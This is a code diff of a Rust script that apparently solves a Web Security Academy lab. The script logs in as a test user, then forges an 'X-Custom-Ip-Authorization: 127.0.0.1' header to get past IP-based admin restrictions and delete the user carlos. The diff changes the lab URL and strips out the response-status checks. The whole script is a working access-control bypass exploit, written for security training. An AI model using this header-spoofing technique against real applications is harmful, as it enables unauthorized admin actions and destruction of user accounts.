@@ -33,7 +33,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a2800640439510284cd1400000a004e.web-security-academy.net";
+    let url = "https://0abb003303fd7bae82b4b248009700d8.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -44,78 +44,73 @@ fn main() {
         .send()
         .expect(&format!("{}", "[!] Failed to GET /login".red()));
 
-    if get_login.status() == 200 {
-        println!("{} {}", "1. Fetching /login page..".white(), "OK".green());
+    println!("{} {}", "⦗1⦘ Fetching /login page..".white(), "OK".green());
 
-        // extract the session
-        let session = extract_session_cookie(get_login.headers())
-            .expect(&format!("{}", "[!] Failed to extract the session".red()));
+    // extract the session
+    let session = extract_session_cookie(get_login.headers())
+        .expect(&format!("{}", "[!] Failed to extract the session".red()));
 
-        // extract the csrf
-        let csrf =
-            extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the token".red()));
+    // extract the csrf
+    let csrf =
+        extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the token".red()));
 
-        println!(
-            "{} {}",
-            "2. Getting session and csrf token..".white(),
-            "OK".green()
-        );
+    println!(
+        "{} {}",
+        "⦗2⦘ Getting session and csrf token..".white(),
+        "OK".green()
+    );
 
-        // try to login as wiener
-        let post_login = client
-            .post(format!("{url}/login"))
-            .form(&HashMap::from([
-                ("username", "wiener"),
-                ("password", "peter"),
-                ("csrf", &csrf),
-            ]))
-            .header("Cookie", format!("session={session}"))
-            .send()
-            .expect(&format!("{}", "[!] Failed to login".red()));
+    // try to login as wiener
+    let post_login = client
+        .post(format!("{url}/login"))
+        .form(&HashMap::from([
+            ("username", "wiener"),
+            ("password", "peter"),
+            ("csrf", &csrf),
+        ]))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to login".red()));
 
-        println!("{} {}", "3. Logging in as wiener..".white(), "OK".green());
+    println!("{} {}", "⦗3⦘ Logging in as wiener..".white(), "OK".green());
 
-        // if login is successful, a redirection will occurred
-        if post_login.status() == 302 {
-            // extract the new session
-            let new_session = extract_session_cookie(post_login.headers()).expect(&format!(
-                "{}",
-                "[!] Failed to extract the new session".red()
-            ));
+    // extract the new session
+    let new_session = extract_session_cookie(post_login.headers()).expect(&format!(
+        "{}",
+        "[!] Failed to extract the new session".red()
+    ));
 
-            println!(
-                "{} {}",
-                "4. Getting a new session as wiener ..".white(),
-                "OK".green()
-            );
-            println!(
-                "{} {}",
-                "5. Bypassing admin access using custom header..".white(),
-                "OK".green()
-            );
+    println!(
+        "{} {}",
+        "⦗4⦘ Getting a new session as wiener ..".white(),
+        "OK".green()
+    );
+    println!(
+        "{} {}",
+        "⦗5⦘ Bypassing admin access using custom header..".white(),
+        "OK".green()
+    );
 
-            // try to delete carlos
-            // bypass the admin access using this header
-            let delete_carlos = client
-                .get(format!("{url}/admin/delete?username=carlos"))
-                .header("Cookie", format!("session={new_session}"))
-                .header("X-Custom-Ip-Authorization", "127.0.0.1")
-                .send()
-                .expect(&format!(
-                    "{}",
-                    "[!] Failed to delete carlos from the admin panel".red()
-                ));
+    // try to delete carlos
+    // bypass the admin access using a custom header
+    client
+        .get(format!("{url}/admin/delete?username=carlos"))
+        .header("Cookie", format!("session={new_session}"))
+        .header("X-Custom-Ip-Authorization", "127.0.0.1")
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to delete carlos from the admin panel".red()
+        ));
 
-            println!("{} {}", "6. Deleting carlos..".white(), "OK".green());
-            println!(
-                "{} {}",
-                "🗹 Check your browser, it should be marked now as"
-                    .white()
-                    .bold(),
-                "solved".green().bold()
-            )
-        }
-    }
+    println!("{} {}", "⦗6⦘ Deleting carlos..".white(), "OK".green());
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
 }
 
 /*******************************************************************
